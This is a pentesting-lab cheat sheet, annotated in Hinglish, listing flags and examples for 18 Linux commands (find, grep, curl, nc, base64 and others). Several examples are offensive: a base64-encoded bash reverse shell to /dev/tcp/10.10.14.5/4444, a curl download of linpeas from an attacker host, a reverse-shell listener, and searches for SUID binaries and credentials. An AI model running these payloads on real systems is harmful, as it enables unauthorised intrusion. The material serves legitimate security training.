# Linux 18 Core Combat Commands - Practical Flag Reference

A practical flag reference sheet with real-world examples for enumeration, text processing, networking, and privilege discovery during pentesting labs.

## 1. `find` (File & Privilege Discovery)

* `-name <pattern>` — Case-sensitive file name dhoondhne ke liye (`-name "*.conf"`).

* `-iname <pattern>` — Case-insensitive file name match karne ke liye.

* `-type <f|d|l>` — File type filter karna (`f` = file, `d` = directory, `l` = symlink).

* `-perm <mode>` — Permissions filter karna (`-perm -4000` SUID bits dhoondhne ke liye, `-perm -2` world-writable files ke liye).

* `-user <username>` — Specific user ki files dhoondhna (`-user root`).

* `-group <groupname>` — Specific group ownership filter karna.

* `-size <+n|-n>` — File size ke hisaab se filter (`-size +100M`).

* `-mmin <-n|+n>` — Last `n` minutes ke andar modify hui files dhoondhna (`-mmin -60`).

* `-exec <cmd> {} \;` — Har matching file par command execute karna (slow, per-file process fork).

* `-exec <cmd> {} +` — Sabhi files ko ek sath batch mein pass karna (faster).

* `-print0` — File names ko null-character (`\0`) ke sath separate karna (spaces safe handling).

* `-maxdepth <n>` — Directory traversal ki depth limit karna.

**Examples:**

```
# Find all SUID binaries on the system for privilege escalation
find / -type f -perm -4000 2>/dev/null

# Find config files modified in the last 30 minutes
find /etc -iname "*config*" -mmin -30 2>/dev/null

```

## 2. `grep` (Pattern & Credential Hunting)

* `-r` / `-R` — Recursive search directory ke andar (`-R` symlinks follow karta hai).

* `-i` — Case-insensitive search (`Password`, `password`, `PASSWORD` sab match karega).

* `-n` — Output mein line number dikhana.

* `-E` — Extended Regular Expressions allow karna (`|`, `+`, `?`).

* `-o` — Poori line chhodkar sirf matching regex string print karna.

* `-v` — Invert match (jo pattern match **NA** kare use dikhana).

* `-l` — Matching lines ke bajay sirf file ka path/name print karna.

* `-I` — Binary files ko skip karna (terminal corrupt hone se bachata hai).

* `-A <n>` — Match ke baad ki `n` lines dikhana (After context).

* `-B <n>` — Match se pehle ki `n` lines dikhana (Before context).

* `-C <n>` — Match ke aage-peeche dono side ki `n` lines dikhana.

**Examples:**

```
# Search recursively for passwords in /var/www while skipping binaries
grep -rniI "password" /var/www/ 2>/dev/null

# Extract all IPv4 addresses from a log file
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' access.log | sort -u

```

## 3. `ss` (Socket Statistics & Listening Ports)

* `-t` — Sirf TCP sockets display karna.

* `-u` — Sirf UDP sockets display karna.

* `-l` — Sirf listening ports dikhana (active established connections chhodkar).

* `-a` — Dono listening aur established sockets display karna.

* `-n` — IP aur port ko numeric format mein dikhana (DNS aur service resolve na karke fast chalna).

* `-p` — Port se associated process name aur PID dikhana (requires `sudo`/root for all).

**Examples:**

```
# Show all listening TCP and UDP ports with process details
sudo ss -tulnp

# View all active established TCP connections
ss -tan state established

```

## 4. `awk` (Field Processing & Reconstruct Engine)

* `-F <delimiter>` — Input field separator set karna (e.g., `-F:` ya `-F','`).

* `-v <var=val>` — Script ke execution se pehle variable pass karna (e.g., `-v OFS="\t"`).

* `-f <script_file>` — Terminal par likhne ke bajay file se AWK script load karna.

**Examples:**

```
# Print usernames and their login shells from /etc/passwd
awk -F: '{print $1 " -> " $7}' /etc/passwd

# Filter users with UID >= 1000 (regular user accounts)
awk -F: '$3 >= 1000 {print $1, $3}' /etc/passwd

```

## 5. `sed` (Stream Editor & In-place Replacement)

* `-i` — Original file mein directly changes save karna (In-place).

* `-i.bak` — Changes save karne se pehle original file ka backup banaye rakhna.

* `-e` — Multiple editing scripts chain karna.

* `-n` — Automatic printing suppress karna (sirf `/p` command par print karega).

* `-E` — Extended regular expressions enable karna.

**Examples:**

```
# Replace old target IP with new IP in-place while keeping a .bak copy
sed -i.bak 's/10.129.1.10/10.129.1.25/g' notes.txt

# Print lines 10 to 20 of a large configuration file
sed -n '10,20p' /etc/ssh/sshd_config

```

## 6. `cut` (Static Column Extraction)

* `-d <delimiter>` — Custom delimiter define karna (default tab hota hai; e.g., `-d:` ya `-d,`).

* `-f <list>` — Kaun se column/field chahiye select karna (`-f1`, `-f1,3`, `-f2-5`).

* `-c <list>` — Character position ke hisaab se kaatna (`-c1-10` shuru ke 10 characters).

* `-s` — Jin lines mein specified delimiter na ho, unhe discard/suppress karna.

**Examples:**

```
# Extract only usernames (column 1) from /etc/passwd
cut -d: -f1 /etc/passwd

# Extract the first 15 characters of each line in a hash file
cut -c1-15 hashes.txt

```

## 7. `tr` (Translate & Character Deletion)

* `-d` — Specified characters ko delete karna (e.g., `tr -d '\r'` Windows carriage return hatane ke liye).

* `-s` — Squeeze repeated characters (multiple spaces ko ek single space mein compress karna).

* `-c` — Complement (jo character list mein **NA** ho use match karna).

**Examples:**

```
# Convert lowercase text to uppercase
echo "htb cpts path" | tr 'a-z' 'A-Z'

# Clean Windows carriage returns (\r) from a script before running on Linux
tr -d '\r' < windows_script.sh > linux_script.sh

```

## 8. `column` (Table Formatting)

* `-t` — Input data ke columns determine karke visually aligned clean table banana.

* `-s <delimiter>` — Columns todne ke liye delimiter batana (e.g., `-s:`; default whitespace).

* `-o <separator>` — Output table ke columns ke beech spacing ya separator customize karna.

**Examples:**

```
# Format /etc/passwd into a clean readable table
column -t -s: /etc/passwd

# Align CSV data into neat columns separated by ' | '
column -t -s',' -o' | ' targets.csv

```

## 9. `xargs` (Argument Building & Parallelization)

* `-n <max-args>` — Ek command invocation mein maximum kitne arguments bhejne hain (`-n 1`).

* `-I <placeholder>` — Argument ko specific position par inject karne ke liye symbol define karna (`-I {}`).

* `-P <max-procs>` — Parallel execution/threads enable karna (`-P 10` for 10 concurrent jobs).

* `-0` — Delimiter ke taur par null character (`\0`) read karna (`find -print0` ke sath pair hota hai).

* `-t` — Command execute hone se pehle use `stderr` par print karna (debugging ke liye).

**Examples:**

```
# Safely search inside all .log files even if filenames contain spaces
find /var/log -name "*.log" -print0 | xargs -0 grep -i "error"

# Run 10 parallel curl header checks across a list of URLs
cat urls.txt | xargs -n 1 -P 10 -I {} curl -sI {}

```

## 10. `lsof` (List Open Files & Descriptors)

* `-i` — Network connections dikhana (`-i :80` ya `-iTCP`).

* `-p <PID>` — Specific process ID dwara open ki gayi saari files list karna.

* `-u <username>` — Specific user ke saare open file descriptors dikhana.

* `-t` — Terse output (sirf process ID print karna, scripting mein `kill` command ke sath useful).

* `+D <dir>` — Directory aur uske andar open sabhi files recursively identify karna.

**Examples:**

```
# Check which process is listening on port 8080
sudo lsof -i :8080

# Kill all processes owned by a specific user
sudo kill -9 $(lsof -t -u suspicious_user)

```

## 11. `ps` (Process Status)

* `a` — Doosre users ke processes bhi dikhana jo terminal se attached hain.

* `u` — Process ke owner aur detailed resource usage (`CPU`/`MEM`) ke sath user-oriented format.

* `x` — Bina controlling terminal wale background processes (daemons/services) dikhana.

* `-e` — System ke sabhi running processes display karna.

* `-f` — Full-format listing (PPID, arguments ke sath).

* `--forest` — Process inheritance tree (parent-child relationship) display karna.

**Examples:**

```
# View all running processes with full user and resource details
ps aux

# Display process hierarchy tree to spot suspicious child processes
ps -ef --forest

```

## 12. `sudo` (Privilege Elevation & Rights Inspection)

* `-l` — List privileges (current user bina password ya limited rights ke kya run kar sakta hai).

* `-u <user>` — Root ke alawa kisi doosre user ke privilege se command run karna (`sudo -u www-data bash`).

* `-i` — Target user ka full interactive login shell open karna.

* `-s` — Target user ki environment mein shell execute karna bina login profile reload kiye.

* `-k` — `sudo` timestamp revoke karna (password session expire karna).

**Examples:**

```
# Check allowed sudo commands (first step in Linux privilege escalation)
sudo -l

# Spawn an interactive shell as another user (e.g., www-data)
sudo -u www-data /bin/bash

```

## 13. `nc` / `netcat` (Arbitrary TCP/UDP Connections & Listeners)

* `-l` — Listen mode (inbound connections accept karna, reverse shell catchers ke liye).

* `-v` — Verbose output (connection details dikhana; `-vv` extra verbosity ke liye).

* `-n` — Numeric IP only, no DNS resolution (scanning aur listeners ko fast aur silent banata hai).

* `-p <port>` — Local source port specify karna (listener ke liye port binding).

* `-u` — UDP mode mein connect ya listen karna.

* `-z` — Zero-I/O mode (data send kiye bina port scanning ke liye use hota hai).

* `-w <seconds>` — Connection timeout limit set karna.

**Examples:**

```
# Start a reverse shell listener on port 4444
nc -lvnp 4444

# Perform a quick TCP port scan on ports 20-25 with a 2-second timeout
nc -zv -w 2 10.129.1.15 20-25

```

## 14. `curl` (Data Transfer & In-Memory Execution)

* `-s` — Silent mode (progress meter aur error messages hide karna).

* `-S` — Agar error aaye toh silent mode mein bhi error screen par dikhana (aksar `-sS` combine hota hai).

* `-o <file>` — Output ko terminal par print karne ke bajay file mein save karna.

* `-O` — Remote URL ke filename ke sath file local directory mein download karna.

* `-I` — Sirf HTTP response headers fetch karna (`HEAD` request).

* `-k` — SSL/TLS certificate verification ignore karna (self-signed certs bypass karne ke liye).

* `-L` — HTTP redirects (`301`/`302`) follow karna.

* `-X <METHOD>` — HTTP method specify karna (`GET`, `POST`, `PUT`, `DELETE`).

* `-d <data>` — HTTP `POST` request mein payload/data send karna.

* `-H <header>` — Custom HTTP header add karna (`-H "Authorization: Bearer <token>"`).

* `-u <user:pass>` — Basic authentication credentials pass karna.

**Examples:**

```
# Download linpeas.sh from your attacker machine silently
curl -sS http://10.10.14.5:8000/linpeas.sh -o /tmp/linpeas.sh

# Fetch HTTP headers ignoring self-signed SSL certificates and following redirects
curl -IkL https://10.129.1.15

```

## 15. `base64` (Payload Encoding & Decoding)

* `-d` — Data ko decode karna (encoded base64 string ko original plain text/binary mein convert karna).

* `-w <cols>` — Output lines ko specific column count par wrap karna (`-w 0` wrapping disable karke single line output deta hai).

**Examples:**

```
# Encode a reverse shell payload into a single-line base64 string
echo -n 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64 -w 0

# Decode an encoded string found in a config file
echo "c3VwZXJzZWNyZXRwYXNzd29yZA==" | base64 -d

```

## 16. `cat` (Concatenate & File Display)

* `-n` — Saari lines ke aage line number lagana.

* `-b` — Sirf non-blank lines par line number lagana.

* `-A` — Hidden characters dikhana (tabs as `^I` aur line ends as `$`).

* `-s` — Lagatar multiple blank lines ko ek single empty line mein compress karna.

**Examples:**

```
# Display a script with line numbers for easy debugging
cat -n exploit.py

# Reveal hidden trailing spaces or Windows line endings ($ vs ^M$)
cat -A suspicious_file.txt

```

## 17. `id` (User & Group Identity Audit)

* `-u` — Sirf numeric User ID (UID) print karna (`-un` username ke liye).

* `-g` — Sirf effective Group ID (GID) print karna (`-gn` group name ke liye).

* `-G` — User se jude sabhi groups ki IDs print karna (`-Gn` saare group names ke liye).

**Examples:**

```
# Check full UID, GID, and group memberships (e.g., docker, lxd, sudo)
id

# Print all group names of the current user in a single line
id -Gn

```

## 18. `groups` (Group Membership Triage)

> **Note:** `groups` command utility mein flags nahi hote. Iska standard syntax seedha username pass karna hota hai:

* `groups` — Current logged-in user ke groups dikhata hai.

* `groups <username>` — Specific target user ki group membership list karta hai.

**Examples:**

```
# Check groups for the current shell user
groups

# Check which privileged groups 'www-data' belongs to
groups www-data

```